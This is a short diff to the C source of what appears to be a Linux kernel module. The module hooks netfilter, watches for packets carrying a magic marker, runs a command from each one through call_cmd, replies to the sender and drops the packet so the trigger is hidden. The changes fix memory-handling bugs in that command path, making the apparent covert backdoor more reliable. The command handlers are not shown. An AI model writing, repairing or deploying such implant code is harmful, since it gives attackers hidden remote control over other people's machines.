@@ -547,13 +547,13 @@ struct MRK_command_work {
 
 static void handle_command(struct work_struct *work) {
     int result;
-    struct MRK_command_work *command_work = (struct MRK_command_work *)work;
+    struct MRK_command_work *command_work = container_of(work, struct MRK_command_work, work);
     result = call_cmd(command_work->cmd, command_work->data + job_id_len + strlen(cmd_magic), command_work->data_len);
     printk(KERN_INFO "Found %s cmd packet! executed with code %d\n", command_work->cmd->name, result);
     send_response(get_unaligned((unsigned short *)(command_work->data + strlen(cmd_magic))), result, command_work->daddr, command_work->saddr, command_work->source, command_work->h_source, command_work->dev);
     // From https://github.com/torvalds/linux/blob/v5.8/kernel/workqueue.c:2173
     // It is permissible to free the struct work_struct from inside the function that is called from it.
-    kfree(work->data);
+    kfree(command_work->data);
     kfree(work);
 }
 
@@ -595,7 +595,7 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
               command_work->source = udph->source;
               memcpy(command_work->h_source, eth_hdr(skb)->h_source, ETH_ALEN);
               command_work->dev = skb->dev;
-              schedule_work((struct work_struct *)command_work);
+              schedule_work(&command_work->work);
             return NF_DROP;
         }
     }
